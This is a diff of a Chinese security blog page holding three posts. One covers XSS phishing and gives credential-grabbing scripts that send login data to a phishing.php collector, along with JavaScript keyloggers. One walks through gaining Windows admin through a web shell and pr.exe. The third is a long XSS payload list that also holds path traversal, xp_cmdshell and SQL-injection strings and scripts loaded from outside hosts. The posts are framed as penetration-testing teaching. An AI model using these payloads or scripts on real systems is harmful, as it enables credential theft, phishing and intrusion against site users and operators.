@@ -78,6 +78,267 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/2017/04/03/XSS之常见钓鱼方式/" title="XSS之常见钓鱼方式" itemprop="url">XSS之常见钓鱼方式</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2017-04-03T10:04:51.000Z" itemprop="datePublished"> 发表于 2017-04-03</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>XSS比较常见的钓鱼方式主要有三种:</p>
+<h3 id="1，XSS重定向钓鱼（XSS-Redirect-Phishing）"><a href="#1，XSS重定向钓鱼（XSS-Redirect-Phishing）" class="headerlink" title="1，XSS重定向钓鱼（XSS Redirect Phishing）"></a>1，XSS重定向钓鱼（XSS Redirect Phishing）</h3><p>这种钓鱼方式是把当前页面重定向到一个钓鱼网站上。假如<a href="http://www.bug.com为漏洞网站，那么钓鱼网站www.evil.com就会完全仿冒正常网站的页面内容及行为，从而进行钓鱼等诈骗活动。" target="_blank" rel="noopener">www.bug.com为漏洞网站，那么钓鱼网站www.evil.com就会完全仿冒正常网站的页面内容及行为，从而进行钓鱼等诈骗活动。</a><br>假设<a href="http://www.bug.com上有一处XSS：" target="_blank" rel="noopener">www.bug.com上有一处XSS：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=[Expliot]</span><br></pre></td></tr></table></figure></p>
+<p>那么，Exploit如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&quot;&apos;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样便会让用户从当前访问的网站跳转到一个邪恶的钓鱼网站。</p>
+<h3 id="2，HTML注入式钓鱼（XSS-HTML-Inject-Phishing）"><a href="#2，HTML注入式钓鱼（XSS-HTML-Inject-Phishing）" class="headerlink" title="2，HTML注入式钓鱼（XSS HTML Inject Phishing）"></a>2，HTML注入式钓鱼（XSS HTML Inject Phishing）</h3><p>HTML注入式钓鱼是指直接利用XSS漏洞注射HTML/JavaScript代码到页面中，请看下面的示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=”’&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form</span><br><span class="line">Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt;</span><br><span class="line">&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这段代码会在正常页面中嵌入一个Form表单.<br>相应的利用代码被附加到URL处，然后构造出一个登录表单，该表单可以覆盖原页面显示，强迫用户输入账号和密码等信息。</p>
+<h3 id="3，XSS-跨框架钓鱼（Iframe-Phishing）"><a href="#3，XSS-跨框架钓鱼（Iframe-Phishing）" class="headerlink" title="3，XSS 跨框架钓鱼（Iframe Phishing）"></a>3，XSS 跨框架钓鱼（Iframe Phishing）</h3><p>这种方式是通过<iframe>标签嵌入远程域的一个页面实施钓鱼，和2.3.1中所描述的例子类似，同样是利用Iframe引用第三方的内容伪造登录控件，此时主页面依然处在正常网站的域名下，因此具有很高的迷惑性。</iframe></p>
+<p>假设有一个XSS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=[Expliot]</span><br><span class="line">那么，XSS Phishing Exploit如下：</span><br><span class="line">http://www.bug.com/index.php?search=&apos;&gt;&lt;iframe src=“http://www.evil.com” height=&quot;100%&quot; width=&quot;100%&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
+<p>Iframe的效果可以做得很真实，可以跨框架覆盖整个页面。以百度为例，新建一个HTML文档，输入下述的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=gb2312&quot;&gt;</span><br><span class="line">&lt;title&gt;百度一下，你就知道      &lt;/title&gt;</span><br><span class="line">&lt;body scroll=&quot;no&quot;&gt;</span><br><span class="line">&lt;iframe name=&quot;myFrame&quot; src=&quot;http://www.baidu.com&quot; width=&quot;100%&quot; height=&quot;100%&quot; scrolling =&quot;auto&quot; frameborder=&quot;0&quot; onload=&quot;this.style.height=document.body.clientHeight&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="钓鱼实战"><a href="#钓鱼实战" class="headerlink" title="钓鱼实战"></a>钓鱼实战</h3><p>利用钓鱼获取明文密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Form = document.forms[&quot;userslogin&quot;];</span><br><span class="line">Form.onsubmit = function()&#123;</span><br><span class="line">var iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">iframe.style.display = &quot;none&quot;;</span><br><span class="line">alert(Form.user.value);</span><br><span class="line">iframe.src = &quot;http://127.0.0.1/phishing.php?user=&quot;+Form.user.value + &quot;&amp;pass=&quot; + Form.pass.value;</span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这段代码用来截取用户在登录页面输入的用户名和密码信息，然后提交给当前创建的PHP脚本（<a href="http://127.0.0.1/phishing.php）。" target="_blank" rel="noopener">http://127.0.0.1/phishing.php）。</a></p>
+<p>或者可以这样做：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">loginForm = document.forms[&apos; userslogin &apos;];</span><br><span class="line">function parseData()</span><br><span class="line">&#123;</span><br><span class="line">var user = loginForm.user.value;</span><br><span class="line">var pass = loginForm.pass.value;</span><br><span class="line">saveData(username,password);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">function saveData(username,password)</span><br><span class="line">&#123;</span><br><span class="line">var frame=document.createElement(&apos;iframe&apos;);       </span><br><span class="line">frame.src=&quot; http://127.0.0.1/phishing.php?user=&quot; + user + &quot;&amp;pass=&quot; + pass;</span><br><span class="line">frame.style.display=&apos;none&apos;;</span><br><span class="line">document.body.appendChild(frame);</span><br><span class="line">&#125;</span><br><span class="line">loginForm.onsubmit = parseData;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>如图2-21所示，在本地进行测试，用浏览器访问测试页面，然后输入一些信息并提交，处理程序便会获取和记录相关信息，如图2-22所示。</p>
+<p>此外，攻击者还可以使用JavaScript编写键盘记录器。<br>假如要劫持链接的onclick事件，可以这样实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(i=0;i&lt;document.links.length;i++)&#123;</span><br><span class="line">document.links[i].onclick = hijack;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>要监听键盘onkeydown事件，具体代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.onkeydown=function(e)&#123;</span><br><span class="line">if(!e)e=window.event;</span><br><span class="line">try&#123;hijack();&#125;catch(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>下面这段代码则可以用于劫持表单的输入框，获取用户输入的用户名和密码信息，并记录下来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.onkeyup=function()&#123;</span><br><span class="line">document.forms[&apos;PassFormlogin&apos;].onsubmit=function()&#123;</span><br><span class="line">   pwd = this.PassInputUsername0.value + &apos;|&apos; + this.PassInputPassword0.value;</span><br><span class="line">   log(escape(pwd));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>此外，通过JavaScript可以遍历Form表单元素，从而抓取一些重要的字段值，下面是一个简单的POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function grabber()&#123;</span><br><span class="line"> F = document.forms;</span><br><span class="line"> for(var j=0; j&lt;F.length; ++j)</span><br><span class="line"> &#123;</span><br><span class="line">  f = F[j];</span><br><span class="line">  for (i=0; i&lt;f.length; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">   if (f[i].type.toLowerCase() == &quot;password&quot;)</span><br><span class="line">   &#123;</span><br><span class="line">    alert(&quot;Password:&quot;+f[i].value)</span><br><span class="line">   &#125;</span><br><span class="line">   else if (f[i].type.toLowerCase() != &quot;submit&quot;)</span><br><span class="line">   &#123;</span><br><span class="line">    alert(&quot;Text:&quot;+f[i].value)</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"> grabber();</span><br></pre></td></tr></table></figure></p>
+<p>JavaScript键盘记录器还可以捕获用户按下的特定键，在IE浏览器中可以使用如下代码实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown() &#123;  </span><br><span class="line">　　 　　      var keycode = event.keyCode;  </span><br><span class="line">　　 　　      var realkey = String.fromCharCode(event.keyCode);  </span><br><span class="line">　　   　　     alert(&quot;按键码: &quot; + keycode + &quot; 字符: &quot; + realkey);  </span><br><span class="line">　　     &#125;  </span><br><span class="line">　　     document.onkeydown = keyDown;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/03/17/PR提权/" title="渗透提权之PR提权" itemprop="url">渗透提权之PR提权</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2017-03-17T03:08:45.000Z" itemprop="datePublished"> 发表于 2017-03-17</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>提权当中最常用的要数PR提权了，但是前几天有个朋友问了我什么是PR提权，其实PR提权就是上传pr.exe 然后执行pr.exe”命令”。<br>解释再多也不如实际来操作演示一遍，刚好i春秋的一题渗透题目要用到PR提权，那就让我们一起看看吧</p>
+<h3 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h3><p>当然是打开我们的大马了，这个大马虽然说界面不是很美，但是功能还是挺全的。大家将就用吧，哈哈</p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/001.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h3><p>执行一下cmd（本来直接点击组件支持就可以了，也不知道是这个大马的原因还是我姿势不对，点击不了。。。。），随便执行一下cmd命令，发现提示如图所示：<br>（有可能组件被删，或者防火墙拦截，或者其他原因，咋们别管）</p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/002.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h3><p>点击查看磁盘，找到可读可写磁盘，然后上传咋们自家的CMD,顺带把PR也一起上传上去吧</p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/003.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h3><p>用我们上传的cmd来执行一下命令，发现是可执行的</p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/004.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h3><p>直接添加一个用户，如图：没反应。（其实应该报错的，有的会报字符太长啥的，有可能这个大马有问题，别管他）</p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/005.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="第六步："><a href="#第六步：" class="headerlink" title="第六步："></a>第六步：</h3><p>利用PR添加用户，如图：添加成功</p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/006.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="第七步："><a href="#第七步：" class="headerlink" title="第七步："></a>第七步：</h3><p>把我们创建的用户添加到管理员组（这样干起事情来方便点）</p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/007.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="最后一步："><a href="#最后一步：" class="headerlink" title="最后一步："></a>最后一步：</h3><p>你管理员权限都有了，想干嘛就干嘛呀 ←_←</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/02/24/XSS跨站测试代码大全/" title="XSS跨站测试代码大全" itemprop="url">XSS跨站测试代码大全</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2017-02-24T10:05:21.000Z" itemprop="datePublished"> 发表于 2017-02-24</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>收集了很多关于xss测试的代码，后期会不断更新</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string">='</span>&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line">%3Cscript%3Ealert(<span class="string">'XSS'</span>)%3C/script%3E</span><br><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;/script&gt;</span><br><span class="line">&lt;img src=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">%0a%0a&lt;script&gt;alert(\<span class="string">"Vulnerable\")&lt;/script&gt;.jsp</span></span><br><span class="line"><span class="string">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span></span><br><span class="line"><span class="string">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span></span><br><span class="line"><span class="string">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span></span><br><span class="line"><span class="string">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span></span><br><span class="line"><span class="string">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span></span><br><span class="line"><span class="string">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span></span><br><span class="line"><span class="string">%3f.jsp</span></span><br><span class="line"><span class="string">%3f.jsp</span></span><br><span class="line"><span class="string">&lt;script&gt;alert('Vulnerable');&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</span></span><br><span class="line"><span class="string">?sql_debug=1</span></span><br><span class="line"><span class="string">a%5c.aspx</span></span><br><span class="line"><span class="string">a.jsp/&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</span></span><br><span class="line"><span class="string">a/</span></span><br><span class="line"><span class="string">a?&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</span></span><br><span class="line"><span class="string">"</span>&gt;&lt;script&gt;alert(<span class="string">'Vulnerable'</span>)&lt;/script&gt;</span><br><span class="line"><span class="string">';exec%20master..xp_cmdshell%20'</span>dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt<span class="string">'--&amp;&amp;</span></span><br><span class="line"><span class="string">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span></span><br><span class="line"><span class="string">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span></span><br><span class="line"><span class="string">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span></span><br><span class="line"><span class="string">1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=</span></span><br><span class="line"><span class="string">http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd</span></span><br><span class="line"><span class="string">..\..\..\..\..\..\..\..\windows\system.ini</span></span><br><span class="line"><span class="string">\..\..\..\..\..\..\..\..\windows\system.ini</span></span><br><span class="line"><span class="string">'</span><span class="string">';!--"&lt;XSS&gt;=&amp;&#123;()&#125;</span></span><br><span class="line"><span class="string">&lt;IMG src="javascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=javascript:alert('</span>XSS<span class="string">')&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=JaVaScRiPt:alert('</span>XSS<span class="string">')&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=JaVaScRiPt:alert("XSS")&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=javascript:alert('</span>XSS<span class="string">')&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=javascript:alert('</span>XSS<span class="string">')&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src="jav ascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src="jav ascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src="jav ascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string">"&lt;IMG src=java\0script:alert(\"XSS\")&gt;";'</span> &gt; out</span><br><span class="line">&lt;IMG src=<span class="string">" javascript:alert('XSS');"</span>&gt;</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;BODY BACKGROUND=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">&lt;BODY ONLOAD=alert(<span class="string">'XSS'</span>)&gt;</span><br><span class="line">&lt;IMG DYNSRC=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">&lt;IMG LOWSRC=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">&lt;BGSOUND src=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br><span class="line">&lt;br size=<span class="string">"&amp;&#123;alert('XSS')&#125;"</span>&gt;</span><br><span class="line">&lt;LAYER src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/layer&gt;</span><br><span class="line">&lt;LINK REL=<span class="string">"stylesheet"</span> href=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br><span class="line">&lt;IMG src=<span class="string">'vbscript:msgbox("XSS")'</span>&gt;</span><br><span class="line">&lt;IMG src=<span class="string">"mocha:[code]"</span>&gt;</span><br><span class="line">&lt;IMG src=<span class="string">"livescript:[code]"</span>&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=<span class="string">"refresh"</span> CONTENT=<span class="string">"0;url=javascript:alert('XSS');"</span>&gt;</span><br><span class="line">&lt;IFRAME src=javascript:alert(<span class="string">'XSS'</span>)&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(<span class="string">'XSS'</span>)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">&lt;DIV STYLE=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span><br><span class="line">&lt;DIV STYLE=<span class="string">"behaviour: url('http://www.how-to-hack.org/exploit.html');"</span>&gt;</span><br><span class="line">&lt;DIV STYLE=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span><br><span class="line">&lt;STYLE&gt;@im\port<span class="string">'\ja\vasc\ript:alert("XSS")'</span>;&lt;/STYLE&gt;</span><br><span class="line">&lt;IMG STYLE=<span class="string">'xss:expre\ssion(alert("XSS"))'</span>&gt;</span><br><span class="line">&lt;STYLE TYPE=<span class="string">"text/javascript"</span>&gt;alert(<span class="string">'XSS'</span>);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE TYPE=<span class="string">"text/css"</span>&gt;.XSS&#123;background-image:url(<span class="string">"javascript:alert('XSS')"</span>);&#125;&lt;/STYLE&gt;&lt;A class=<span class="string">"XSS"</span>&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;BODY&#123;background:url(<span class="string">"javascript:alert('XSS')"</span>)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;BASE href=<span class="string">"javascript:alert('XSS');//"</span>&gt;</span><br><span class="line">getURL(<span class="string">"javascript:alert('XSS')"</span>)</span><br><span class="line">a=<span class="string">"get"</span>;b=<span class="string">"URL"</span>;c=<span class="string">"javascript:"</span>;d=<span class="string">"alert('XSS');"</span>;<span class="built_in">eval</span>(a+b+c+d);</span><br><span class="line">&lt;XML src=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br><span class="line"><span class="string">"&gt; &lt;BODY ONLOAD="</span>a();<span class="string">"&gt;&lt;SCRIPT&gt;function a()&#123;alert('XSS');&#125;&lt;/SCRIPT&gt;&lt;"</span></span><br><span class="line">&lt;SCRIPT src=<span class="string">"http://xss.ha.ckers.org/xss.jpg"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG src=<span class="string">"javascript:alert('XSS')"</span></span><br><span class="line">&lt;!--<span class="comment">#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;'"--&gt;</span></span><br><span class="line">&lt;IMG src=<span class="string">"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"</span>&gt;</span><br><span class="line">&lt;SCRIPT a=<span class="string">"&gt;"</span> src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT =<span class="string">"&gt;"</span> src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=<span class="string">"&gt;"</span> <span 